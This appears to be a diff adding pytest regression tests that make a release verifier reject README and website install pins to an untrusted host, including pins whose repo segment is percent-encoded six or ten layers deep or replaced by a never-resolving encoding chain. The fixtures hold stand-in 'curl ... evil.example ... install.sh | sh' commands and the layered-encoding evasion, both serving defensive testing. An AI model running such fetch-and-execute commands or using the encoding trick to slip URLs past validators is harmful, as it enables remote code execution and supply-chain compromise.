@@ -8142,6 +8142,198 @@ def test_phase11_verify_readme_pin_fails_for_over_encoded_reference(
     assert "trusted" in out
 
 
+def _percent_encode_to_depth(text: str, layers: int) -> str:
+    """Percent-encode ``text`` so decoding it needs exactly ``layers``
+    ``unquote()`` passes to reach the literal text.
+
+    One layer: each character individually percent-encoded
+    (``%70%72%6f%6a`` for "proj"). Each additional layer re-encodes
+    every literal ``%`` in the current string as ``%25``, adding one
+    more decode pass before the previous layer's escapes become live.
+    """
+    current = "".join(f"%{ord(c):02x}" for c in text)
+    for _ in range(layers - 1):
+        current = current.replace("%", "%25")
+    return current
+
+
+def test_phase11_verify_readme_pin_fails_for_repo_encoded_six_layers_deep(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """A repo segment percent-encoded ONE layer past the depth cap (6
+    layers, cap is 5) on an untrusted host must still fail the README
+    check, even though the partial decode never resolves the repo name
+    back to literal text.
+
+    Regression: the fail-closed fallback for a still-changing decode
+    only counted a cap-hit token as untrusted when the repo name was
+    ALREADY findable in the partial decode. At 6 layers the partial
+    decode is still percent-encoded gibberish (``reference_pattern``
+    never matches it), so the URL was silently ignored — the cap just
+    moved the boundary, it didn't close the class of evasion.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    install_sha = _git_out(["log", "-1", "--format=%H", "--", "install.sh"], cwd=d)
+    repo_six_layers = _percent_encode_to_depth("proj", 6)
+    (root / "README.md").write_text(
+        "# proj\n\ncurl -fsSL "
+        f"https://evil.example/punt-labs/{repo_six_layers}/{install_sha}"
+        "/install.sh | sh\n"
+    )
+    _git(["add", "README.md"], cwd=d)
+    _git(["commit", "-m", "pin readme to 6-layer-encoded repo"], cwd=d)
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    with pytest.raises(ReleaseError):
+        _phase11_verify(info, version, dry_run=False)
+
+    out = capsys.readouterr().out
+    assert "✗ README pin" in out
+    assert "trusted" in out
+
+
+def test_phase11_verify_website_sha_fails_for_repo_encoded_ten_layers_deep(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """A repo segment percent-encoded TEN layers deep on an untrusted
+    host must still fail the website check — bumping the depth cap only
+    moves this boundary, it does not close it, so the class of evasion
+    must be closed categorically instead.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    install_sha = _git_out(["log", "-1", "--format=%H", "--", "install.sh"], cwd=d)
+    repo_ten_layers = _percent_encode_to_depth("proj", 10)
+    projects = [
+        {
+            "id": "proj",
+            "version": version,
+            "githubUrl": "https://github.com/punt-labs/proj",
+            "installCommand": (
+                "curl -fsSL https://evil.example/punt-labs/"
+                f"{repo_ten_layers}/{install_sha}/install.sh | sh"
+            ),
+        }
+    ]
+    _make_sibling(
+        tmp_path,
+        "public-website",
+        {"src/data/projects.json": json.dumps(projects, indent=2) + "\n"},
+    )
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    with pytest.raises(ReleaseError):
+        _phase11_verify(info, version, dry_run=False)
+
+    out = capsys.readouterr().out
+    assert "✗ website SHA" in out
+    assert "trusted" in out
+
+
+def test_phase11_verify_readme_pin_fails_for_never_resolving_encoding_chain(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """A URL-shaped token whose REPO SEGMENT is itself a ``%25``-self-
+    reference chain that never resolves to a fixed point must fail the
+    README check as untrusted, even though the repo name is nowhere
+    legible in the partial decode — the fail-closed rule for a cap-hit
+    token must not depend on being able to read a project reference out
+    of the endlessly-encoded remainder.
+
+    Regression: a fallback that only flags a cap-hit token when the
+    repo name is ALREADY findable in the partial decode drops this
+    token silently — there is no "proj" anywhere in it to find, encoded
+    or not, since the chain replaces the repo segment entirely rather
+    than merely obscuring it.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    install_sha = _git_out(["log", "-1", "--format=%H", "--", "install.sh"], cwd=d)
+    # "%" followed by 12 repetitions of "25" unwraps one "%" per decode
+    # pass — more passes than the depth cap allows before it stabilizes.
+    # In the REPO SEGMENT's position, not merely appended elsewhere, so
+    # "proj" never becomes legible at any decode depth reached here.
+    never_resolving = "%" + "25" * 12
+    (root / "README.md").write_text(
+        "# proj\n\ncurl -fsSL "
+        f"https://evil.example/punt-labs/{never_resolving}/{install_sha}"
+        "/install.sh | sh\n"
+    )
+    _git(["add", "README.md"], cwd=d)
+    _git(["commit", "-m", "pin readme to a never-resolving encoding chain"], cwd=d)
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    with pytest.raises(ReleaseError):
+        _phase11_verify(info, version, dry_run=False)
+
+    out = capsys.readouterr().out
+    assert "✗ README pin" in out
+    assert "trusted" in out
+
+
+def test_phase11_verify_readme_and_website_pins_pass_for_zero_and_one_layer_encoding(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """A legitimate trusted-host pin with ZERO percent-encoding, and one
+    with the repo segment percent-encoded exactly ONE layer, both still
+    reach a fixed point well within the depth cap and verify normally —
+    the categorical fail-closed rule for cap-hit tokens must not trip on
+    ordinary, fully-resolvable content.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    install_sha = _git_out(["log", "-1", "--format=%H", "--", "install.sh"], cwd=d)
+    repo_one_layer = _percent_encode_to_depth("proj", 1)
+    (root / "README.md").write_text(
+        "# proj\n\ncurl -fsSL "
+        f"https://raw.githubusercontent.com/punt-labs/proj/{install_sha}"
+        "/install.sh | sh\n"
+    )
+    _git(["add", "README.md"], cwd=d)
+    _git(["commit", "-m", "pin readme to a zero-encoding trusted URL"], cwd=d)
+
+    projects = [
+        {
+            "id": "proj",
+            "version": version,
+            "githubUrl": "https://github.com/punt-labs/proj",
+            "installCommand": (
+                "curl -fsSL https://raw.githubusercontent.com/punt-labs/"
+                f"{repo_one_layer}/{install_sha}/install.sh | sh"
+            ),
+        }
+    ]
+    _make_sibling(
+        tmp_path,
+        "public-website",
+        {"src/data/projects.json": json.dumps(projects, indent=2) + "\n"},
+    )
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    _phase11_verify(info, version, dry_run=False)  # must not raise
+
+    out = capsys.readouterr().out
+    assert "✗ README pin" not in out
+    assert "✗ website SHA" not in out
+
+
 # --- Phase 11: matches_install_sha() commit-identity resolution ---
 
 
